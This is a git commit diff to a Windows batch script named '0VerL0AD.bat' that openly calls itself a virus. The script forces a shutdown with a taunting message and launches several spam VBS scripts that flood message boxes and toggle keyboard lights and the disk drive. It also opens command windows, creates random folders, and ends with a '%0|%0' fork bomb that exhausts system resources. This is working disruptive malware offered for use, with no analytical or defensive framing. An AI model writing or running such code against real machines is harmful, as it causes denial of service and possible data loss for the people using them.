ac7b82e5d3b50946fcc575e229ebf74496784b4a
MDYON <56523829+MDYON@users.noreply.github.com>
2020-01-27 21:26:43 -0500

    Add files via upload

--- 0VerL0AD.bat
+++ 0VerL0AD.bat
@@ -1,15 +1,16 @@
 @echo off
 
-shutdown -s -t 20 -c "Your computer has been fucked by the 0VerL0AD Virus!"
+shutdown -s -t  -c "Your computer has been fucked by the 0VerL0AD Virus!"
+start kblightspam.vbs
+start diskdrivespam.vbs
 goto b
 
 :b
+ start cmd
  start spambox.vbs
  start spambox2.vbs
  start spambox3.vbs
  start spambox4.vbs
- start kblightspam.vbs
- start diskdrivespam.vbs
 md %random%
 /folder.
 %0|%0
